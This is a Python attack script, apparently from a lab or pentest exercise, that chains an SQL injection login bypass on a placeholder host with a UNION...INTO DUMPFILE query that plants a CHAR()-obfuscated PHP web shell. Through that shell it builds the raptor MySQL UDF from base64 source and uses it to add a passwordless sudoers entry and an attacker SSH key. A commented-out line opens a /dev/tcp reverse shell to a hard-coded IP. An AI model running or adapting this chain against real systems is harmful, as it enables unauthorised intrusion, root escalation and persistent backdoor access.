#!/usr/bin/env python

# This is a stub for developing persistence over SSH, using base64-encoded
# MySQL UDF (raptor), a simple SQLi to bypass authorization (LOGIN) and
# another SQL vulnerability to plant a remote execution script (STEP_UPLOAD).

import base64
import requests
import urllib


URL_BASE = 'http://VAR_TARGET_HOST/{}'

EXEC_BASE = '?cmd=/bin/bash -c "{}"'  # Path to cmd/webshell

DIR_BASE = '/tmp/VAR_STRING'  # Temporary directory for storing payloads

LOGIN = {
    'username': '\' or 1=1#',  # Authorization bypass
    'password': '',
}

UPLOAD_FILENAME = 'shell.php'

USERNAME = 'VAR_USERNAME'
PASSWORD = 'VAR_PASSWORD'

STEP_UPLOAD = (
    '2 UNION ALL SELECT 1,2,3,4,5,'
    # CONCAT(CHAR(60)[...] == <?php echo shell_exec($_GET['cmd']);?>
    'CONCAT(CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(101),CHAR(99),CHAR(104),CHAR(111),CHAR(32),CHAR(115),CHAR(104),CHAR(101),CHAR(108),CHAR(108),CHAR(95),CHAR(101),CHAR(120),CHAR(101),CHAR(99),CHAR(40),CHAR(36),CHAR(95),CHAR(71),CHAR(69),CHAR(84),CHAR(91),CHAR(39),CHAR(99),CHAR(109),CHAR(100),CHAR(39),CHAR(93),CHAR(41),CHAR(59),CHAR(63),CHAR(62))'
    ' INTO DUMPFILE "/var/www/html/{}"'.format(UPLOAD_FILENAME)
)

MYSQL_UDF = (
    'create table foo(line blob);'
    'insert into foo values(load_file(\'{dir}/raptor_udf2.so\'));'
    'select * from foo into dumpfile \'/usr/lib/raptor_udf2.so\';'
    'create function do_system returns integer soname \'raptor_udf2.so\';'
)

USER_ADD = (
    'select do_system(\'echo "{username}    ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\');'
    'select do_system(\'echo "{username}:{password}" | /usr/sbin/chpasswd\');'
)

with open('~/.ssh/id_rsa.pub', 'rb') as fil:
    ssh_pub = fil.read()

USER_SSH = (
    'select do_system(\'echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config\');'
    'select do_system(\'/etc/init.d/sshd restart\');'
    'select do_system(\'mkdir -p /home/{username}/.ssh\');'
    'select do_system(\'echo "' + ssh_pub + '" > /home/{username}/.ssh/authorized_keys\');'
    'select do_system(\'chmod 600 /home/{username}/.ssh/authorized_keys\');'
    'select do_system(\'chmod 700 /home/{username}/.ssh\');'
    'select do_system(\'chown -R {username}:{username} /home/{username}\');'
    'select do_system(\'chmod g-w /home/{username}\');'
)

STEP_ADDUSER = (

    # 'exec nohup setsid /bin/bash 0</dev/tcp/10.11.0.197/53 1>&0 2>&0 &',
    'rm -rf {dir}'.format(dir=DIR_BASE),
    'mkdir {dir}'.format(dir=DIR_BASE),

    # UDF for MySQL
    'echo I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQoNCmVudW0g >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo SXRlbV9yZXN1bHQge1NUUklOR19SRVNVTFQsIFJFQUxfUkVTVUxULCBJTlRfUkVT >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo VUxULCBST1dfUkVTVUxUfTsNCg0KdHlwZWRlZiBzdHJ1Y3Qgc3RfdWRmX2FyZ3Mg >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo ew0KCXVuc2lnbmVkIGludAkJYXJnX2NvdW50Ow0KCWVudW0gSXRlbV9yZXN1bHQJ >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo KmFyZ190eXBlOw0KCWNoYXIgCQkJKiphcmdzOw0KCXVuc2lnbmVkIGxvbmcJCSps >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo ZW5ndGhzOw0KCWNoYXIJCQkqbWF5YmVfbnVsbDsNCn0gVURGX0FSR1M7DQoNCnR5 >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo cGVkZWYgc3RydWN0IHN0X3VkZl9pbml0IHsNCgljaGFyCQkJbWF5YmVfbnVsbDsN >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo Cgl1bnNpZ25lZCBpbnQJCWRlY2ltYWxzOw0KCXVuc2lnbmVkIGxvbmcgCQltYXhf >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo bGVuZ3RoOw0KCWNoYXIJCQkqcHRyOw0KCWNoYXIJCQljb25zdF9pdGVtOw0KfSBV >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo REZfSU5JVDsNCg0KaW50IGRvX3N5c3RlbShVREZfSU5JVCAqaW5pdGlkLCBVREZf >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo QVJHUyAqYXJncywgY2hhciAqaXNfbnVsbCwgY2hhciAqZXJyb3IpDQp7DQoJaWYg >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo KGFyZ3MtPmFyZ19jb3VudCAhPSAxKQ0KCQlyZXR1cm4oMCk7DQoNCglzeXN0ZW0o >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo YXJncy0+YXJnc1swXSk7DQoNCglyZXR1cm4oMCk7DQp9DQoNCmNoYXIgZG9fc3lz >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo dGVtX2luaXQoVURGX0lOSVQgKmluaXRpZCwgVURGX0FSR1MgKmFyZ3MsIGNoYXIg >> {dir}/src.b64'.format(dir=DIR_BASE),
    'echo Km1lc3NhZ2UpDQp7DQoJcmV0dXJuKDApOw0KfQ0K >> {dir}/src.b64'.format(dir=DIR_BASE),
    'cat {dir}/src.b64 | openssl base64 -d >> {dir}/raptor_udf2.c'.format(dir=DIR_BASE),
    'gcc -g -c {dir}/raptor_udf2.c -o {dir}/raptor_udf2.o'.format(dir=DIR_BASE),
    'gcc -g -shared -W1,-soname,raptor_udf2.so -o {dir}/raptor_udf2.so {dir}/raptor_udf2.o -lc'.format(dir=DIR_BASE),

    # MYSQL_UDF
    'echo {sql} >> {dir}/step1.b64'.format(
        sql=base64.b64encode(MYSQL_UDF.format(dir=DIR_BASE, username=USERNAME, password=PASSWORD)),
        dir=DIR_BASE
    ),
    'cat {dir}/step1.b64 | openssl base64 -A -d >> {dir}/step1.sql'.format(dir=DIR_BASE),
    'mysql -f -u root mysql < {dir}/step1.sql'.format(dir=DIR_BASE),

    # USER_ADD
    'echo {sql} >> {dir}/step2.b64'.format(
        sql=base64.b64encode(USER_ADD.format(dir=DIR_BASE, username=USERNAME, password=PASSWORD)),
        dir=DIR_BASE
    ),
    'cat {dir}/step2.b64 | openssl base64 -A -d >> {dir}/step2.sql'.format(dir=DIR_BASE),
    'mysql -f -u root mysql < {dir}/step2.sql'.format(dir=DIR_BASE),

    # USER_SSH
    'echo {sql} >> {dir}/step3.b64'.format(
        sql=base64.b64encode(USER_SSH.format(dir=DIR_BASE, username=USERNAME, password=PASSWORD)),
        dir=DIR_BASE
    ),
    'cat {dir}/step3.b64 | openssl base64 -A -d >> {dir}/step3.sql'.format(dir=DIR_BASE),
    'mysql -f -u root mysql < {dir}/step3.sql'.format(dir=DIR_BASE),

    # Cleanup
    'rm -rf {}'.format(DIR_BASE),
)


with requests.Session() as session:

    print(':: Logging in')
    session.post(
        URL_BASE.format('index.php'),
        data=LOGIN
    )

    print(':: Planting script')
    session.get(
        URL_BASE.format('edit.php?article=') + STEP_UPLOAD
    )

    print(':: Executing commands')
    for cmd in STEP_ADDUSER:
        print(cmd)
        session.get(
            URL_BASE.format(UPLOAD_FILENAME) + EXEC_BASE.format(urllib.quote(cmd))
        )


print('\nDone')
